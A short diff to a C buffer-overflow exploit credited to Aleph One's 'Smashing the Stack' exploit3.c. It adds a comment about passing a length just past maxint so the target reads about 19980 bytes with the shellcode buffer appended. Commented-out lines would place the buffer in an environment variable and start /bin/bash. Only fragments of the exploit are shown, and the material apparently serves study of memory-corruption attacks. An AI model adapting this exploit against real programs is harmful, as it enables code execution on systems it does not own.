@@ -1,5 +1,6 @@
 /*
 *  Aleph's shellcode
+*  Based on exploit3.c from http://insecure.org/stf/smashstack.html
 */
 
 #include <stdlib.h>
@@ -48,7 +49,9 @@ void main(int argc, char *argv[]) {
 
   buff[bsize - 1] = '\0';
 
-  printf("2147484647,%s",buff);
+  //2147483647 is maxint, add 1000 to read in 19980 bytes, then stick our buffer at the end
+  printf("2147484647,%s",buff); 
+  
   // memcpy(buff,"EGG=",4);
   // putenv(buff);
   // system("/bin/bash");
